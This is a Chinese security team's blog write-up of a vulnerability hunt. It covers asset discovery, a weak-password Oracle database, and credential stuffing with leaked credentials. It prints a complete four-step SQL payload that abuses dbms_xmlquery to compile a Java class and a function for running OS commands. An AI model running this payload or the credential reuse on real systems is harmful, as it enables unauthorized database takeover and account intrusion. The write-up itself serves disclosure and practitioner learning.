#  记一次CNVD事件漏洞挖掘思路   
 奉天安全团队   2024-12-18 03:01  
  
免责声明：  
  
文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责  
### 一、信息收集  
  
信息收集的目的是了解目标的基本情况，包括网络拓扑结构、系统架构、运行的服务和应用程序、已知漏洞、潜在安全风险等。通过信息收集，渗透测试人员可以获得对目标的深入了解，从而确定可能的攻击矢量和漏洞利用路径，为后续的渗透测试工作做准备。  
  
通过鹰图平台进行查询：  
  
icp.name=xxx  
  
该语法是搜索ICP备案单位名中含有“xxx”的资产  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FxYwHqCMGPHAmnqKjH6QdRBYjx2BGJ86b7MhI4qWD29EvmtCRGXHmtbZbnuDKa4BrLgUIicYC6N46uWLDyjqIUA/640?wx_fmt=png&from=appmsg "")  
  
很快找到了一个数据库存在弱口令  
  
通过工具 我们对进行漏洞利用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FxYwHqCMGPHAmnqKjH6QdRBYjx2BGJ86meYOCf8z4ylcBuEKWbh6f8ISRVTeLeU1B58KJFib7bBLRC4JTpvze7g/640?wx_fmt=png&from=appmsg "")  
  
上述工具Rce命令执行并不稳定，会存在报错等情况。  
  
这里还有一种手法通过手工Payload提权，到创建函数，在Navicat上稳定命令执行：  
  
1、创建java source：  
  
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;  
  
2、创建函数：  
  
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;  
  
3、可以通过查询OBJECT_ID来判断函数是否创建成功:  
  
select OBJECT_ID from all_objects where object_name ='LINXRUNCMD';  
  
4、最后一步执行命令：  
  
  
select LinxRUNCMD('/sbin/ifconfig') from dual;  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FxYwHqCMGPHAmnqKjH6QdRBYjx2BGJ86EdohOicEF7XSNxG8yfFUDSHdGwWn8ckl6KialKweJHW5wxzpLgia0IEzA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FxYwHqCMGPHAmnqKjH6QdRBYjx2BGJ86E8p0cLYsS5J75QBnLm4518Zr2TCxWgbHicibl0ibDhSW58FnGuhvVia2aQ/640?wx_fmt=png&from=appmsg "")  
  
从上述数据库发现的其他数据库配置，连接，数据情况  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FxYwHqCMGPHAmnqKjH6QdRBYjx2BGJ86J3sQVk0B8s666XUCEtHAdDIibjEl6cxPu1aRe3SWAme6YHKktLKCxaA/640?wx_fmt=png&from=appmsg "")  
  
上述文件导致测试账密泄露，下面是利用文件里的账密撞库成功  
  
http://xxxxxx/login  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FxYwHqCMGPHAmnqKjH6QdRBYjx2BGJ8626Fuib0jmmnljZX41ibrYXGEnK58VrkZKficx2oVsGIxSX0xHqrekumfg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FxYwHqCMGPHAmnqKjH6QdRBYjx2BGJ865ULOC5GflWjAvcLvO1jm6GDiadBDbibjicFM3b9bEju1icTeEnc9KcCDyg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FxYwHqCMGPHAmnqKjH6QdRBYjx2BGJ86IkcvyRSricbccicJlAkE8TY5YAosfy82bWqSOoibpzsCia0lUibJ4OTCIPg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
